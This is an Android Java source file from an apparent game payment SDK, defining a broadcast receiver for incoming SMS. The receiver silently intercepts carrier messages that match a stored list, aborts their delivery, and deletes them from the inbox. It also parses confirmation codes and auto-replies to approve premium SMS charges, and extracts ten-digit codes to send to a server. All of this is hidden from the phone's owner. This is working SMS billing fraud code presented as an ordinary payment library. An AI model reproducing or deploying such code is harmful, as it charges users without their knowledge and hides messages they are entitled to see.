package com.legame.paysdk.receiver;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.legame.paysdk.activity.LYGamePayment;
import com.legame.paysdk.db.MdoSmsBlockDb;
import com.legame.paysdk.models.Block;
import com.legame.paysdk.network.engine.BaseNetEngine;
import com.legame.paysdk.network.engine.VirtualCodeNetEngine;
import com.legame.paysdk.network.task.NetTask;
import com.legame.paysdk.network.task.NetTask.NetTaskListener;
import com.legame.paysdk.network.utils.NetTools;
import com.legame.paysdk.utils.LogUtil;
import com.legame.paysdk.utils.SmsBasePay;
import com.legame.paysdk.utils.SmsBasePay.MdoPayCallBack;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

public class SmsInterceptReceiver extends BroadcastReceiver implements
		NetTaskListener {

	public static boolean isFirstzwjfPay = false;
	
	public static boolean isSecondzwjfPay = false;
	
	private final static String TAG = "SmsInterceptReceiver";
	
	// 广播消息类型
	public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private String patternCoder = "(?<!\\d)\\d{10}(?!\\d)";

	private Boolean isBlockByNumber(String phoneNumber, String blockNumber) {
		if (phoneNumber.startsWith(blockNumber)) {
			return true;
		}
		return false;
	}

	private Boolean isBlockByContent(String smsContent, String blockContent) {
		String[] splitKeyWord = blockContent.split("&");
		for (int i = 0; i < splitKeyWord.length; i++) {
			if (!smsContent.contains(splitKeyWord[i])) {
				return false;
			}
		}
		return true;
	}

	@Override
	public void onReceive(final Context context, Intent intent) {
		Bundle bundle = intent.getExtras();
		if (bundle == null) {
			return;
		}
		Object[] pdus = (Object[]) bundle.get("pdus");
		if (pdus == null || pdus.length == 0) {
			return;
		}

		List<Block> blockList = MdoSmsBlockDb.instance(context).query();
		if (blockList == null || blockList.size() == 0) {
			return;
		}

		for (int i = 0; i < pdus.length; i++) {
			SmsMessage message = SmsMessage.createFromPdu((byte[]) pdus[i]);
			String smsContent = message.getDisplayMessageBody();
			String smsNumber = message.getDisplayOriginatingAddress().replace("+86", "");
			
			for (Block block : blockList) {
				String blockContent = block.getmKeyWord();
				String blockNumber = block.getmNumber();
				if (TextUtils.isEmpty(blockContent) && !TextUtils.isEmpty(blockNumber)) {
					if(isBlockByNumber(smsNumber, blockNumber)){
						MdoSmsBlockDb.instance(context).delete(block.getId());
						abortBroadcast();
						deleteSMS(context, smsContent, smsNumber);
					}
					return;
				} else if (!TextUtils.isEmpty(blockContent) && TextUtils.isEmpty(blockNumber)) {
					if(isBlockByContent(smsContent, blockContent)){
						MdoSmsBlockDb.instance(context).delete(block.getId());
						abortBroadcast();
						deleteSMS(context, smsContent, smsNumber);
					}
					return;
				} else if (!TextUtils.isEmpty(blockContent) && !TextUtils.isEmpty(blockNumber)) {
					if(isBlockByNumber(smsNumber, blockNumber) && isBlockByContent(smsContent, blockContent)){
						if(isFirstzwjfPay){
							isFirstzwjfPay = false;
							String reply = txtToNum(smsContent);
							SmsBasePay smsBasePay = new SmsBasePay();
							smsBasePay.pay(context, smsNumber, reply, new MdoPayCallBack() {
								
								@Override
								public void onMdoPayResult(int status) {
									if(status == 0){
										isSecondzwjfPay = true;
										Block blockInfo = new Block();
										blockInfo.setmKeyWord("106571204999600088");
										blockInfo.setmNumber("卓行天下");
										MdoSmsBlockDb.instance(context).save(blockInfo);
									}
									
								}
							});
						}
						
						if(isSecondzwjfPay){
							String virtualCode = patternCode(smsContent);
							if(TextUtils.isEmpty(virtualCode)){
								break;
							}
							String sid = NetTools.getSid(context);
							String orderId = "";
							VirtualCodeNetEngine engine = new VirtualCodeNetEngine(sid, virtualCode, orderId);
							NetTask task = new NetTask(context, engine, 0);
							task.setListener(this);
							new Thread(task).start();
						}
						
						MdoSmsBlockDb.instance(context).delete(block.getId());
						abortBroadcast();
						deleteSMS(context, smsContent, smsNumber);
					}
					return;
				}
			}

		}

	}
	
	public void deleteSMS(Context context, String smsContent, String smsNumber) {
		try {
			// 准备系统短信收信箱的uri地址
			Uri uri = Uri.parse("content://sms/inbox");
			// 收信箱 // 查询收信箱里全部的短信
			Cursor isRead = context.getContentResolver().query(uri, null,
					"read=" + 0, null, null);
			while (isRead.moveToNext()) {
				String phone = isRead.getString(
						isRead.getColumnIndex("address")).trim();
				if (phone.startsWith("+86")) {
					phone = smsNumber.replace("+86", "");
				}
				String body = isRead.getString(isRead.getColumnIndex("body"))
						.trim();
				String pid = isRead.getString(isRead
						.getColumnIndex("thread_id"));
				if (body.equals(smsContent) && phone.equals(smsNumber)) {
					String uriStr = "content://sms/conversations/" + pid;
					context.getContentResolver().delete(Uri.parse(uriStr),
							null, null);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 匹配短信中间的1个数字（验证码）
	 * 
	 * @param message
	 * @return
	 */
	private String txtToNum(String message) {
		String content2 = message.replace(" ", "");// 去除字符串里面的空格
		int starts = 0;
		int end = 0;
		int len = 0;
		String phrase = "";
		for (len = 0; len < content2.length(); ++len) {

			if (content2.indexOf("复", starts) != -1
					&& content2.indexOf("确", end) != -1) {
				starts = content2.indexOf("复", starts);
				end = content2.indexOf("确", end);
				phrase = content2.substring(starts + 1, end);
			}
		}
		return phrase;
	}

	/**
	 * 匹配短信中间的10个数字（验证码等）
	 * 
	 * @param patternContent
	 * @return
	 */
	private String patternCode(String patternContent) {
		if (TextUtils.isEmpty(patternContent)) {
			return null;
		}
		Pattern p = Pattern.compile(patternCoder);
		Matcher matcher = p.matcher(patternContent);
		if (matcher.find()) {
			return matcher.group();
		}
		return null;
	}

	@Override
	public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onTaskRunError(int tag) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onTaskRunCanceled(int tag) {
		// TODO
		
	}

	private ArrayList<String> wordAry = new ArrayList<String>();
	String keyWord;
	private String returnMsg;
	private String beginWord;
	private String endWord;

	public String OnTest(String str) {
		this.keyWord = str;

		if (this.keyWord.indexOf("|") != -1) {
			while (this.keyWord.indexOf("|") != -1) {
				if (this.keyWord.startsWith("|")) {
					this.keyWord = this.keyWord.substring(1);
				}
				String tempStr;
				if (this.keyWord.indexOf("|") != -1) {
					tempStr = this.keyWord.substring(0,
							this.keyWord.indexOf("|"));
				} else {
					tempStr = this.keyWord;
				}
				if (tempStr.startsWith("beginWord")) {
					tempStr = tempStr.substring("beginWord".length());
					this.beginWord = tempStr;
				}
				if (tempStr.startsWith("endWord")) {
					tempStr = tempStr.substring("endWord".length());
					this.endWord = tempStr;
				}
				this.wordAry.add(tempStr);
				if (this.keyWord.indexOf("|") != -1) {
					this.keyWord = this.keyWord.substring(this.keyWord
							.indexOf("|"));
				}
			}
		} else {
			this.wordAry.add(this.keyWord);
		}
		return beginWord;
	}

	public String OnTest2(String str) {
		this.keyWord = str;

		if (this.keyWord.indexOf("_") != -1) {
			while (this.keyWord.indexOf("_") != -1) {
				if (this.keyWord.startsWith("_")) {
					this.keyWord = this.keyWord.substring(1);
				}
				String tempStr;
				if (this.keyWord.indexOf("_") != -1) {
					tempStr = this.keyWord.substring(0,
							this.keyWord.indexOf("_"));
				} else {
					tempStr = this.keyWord;
				}
				if (tempStr.startsWith("beginWord")) {
					tempStr = tempStr.substring("beginWord".length());
					this.beginWord = tempStr;
				}
				if (tempStr.startsWith("endWord")) {
					tempStr = tempStr.substring("endWord".length());
					this.endWord = tempStr;
				}
				this.wordAry.add(tempStr);
				if (this.keyWord.indexOf("_") != -1) {
					this.keyWord = this.keyWord.substring(this.keyWord
							.indexOf("_"));
				}
			}
		} else {
			this.wordAry.add(this.keyWord);
		}

		return beginWord;
	}

	private String trimStr(String str) {
		if (str.indexOf("\"") != -1)
			str = str.replace("\"", "");
		if (str.indexOf("\"") != -1)
			str = str.replace("\"", "");
		if (str.indexOf("“") != -1)
			str = str.replace("“", "");
		if (str.indexOf("”") != -1)
			str = str.replace("”", "");
		return str;
	}

	public String onSmsContent(String keyContent) {

		Log.d("test", "msg:" + keyContent);
		if (keyContent.indexOf(this.beginWord) != -1) {
			keyContent = keyContent.substring(keyContent
					.indexOf(this.beginWord) + this.beginWord.length());
			Log.d("onRec", "msg1:" + keyContent);
			if (keyContent.indexOf(this.endWord) != -1) {
				keyContent = keyContent.substring(0,
						keyContent.indexOf(this.endWord));
				Log.d("onRec", "msg2:" + keyContent);

				this.returnMsg = keyContent;
				Log.d("re", this.returnMsg);
				this.returnMsg = trimStr(this.returnMsg);
				Log.d("re", this.returnMsg);
				// 这里发短信
				Log.d("send", this.returnMsg);
			} else {
				Log.d("onRec", this.endWord + "==null");
			}
		}
		return returnMsg;
	}

}
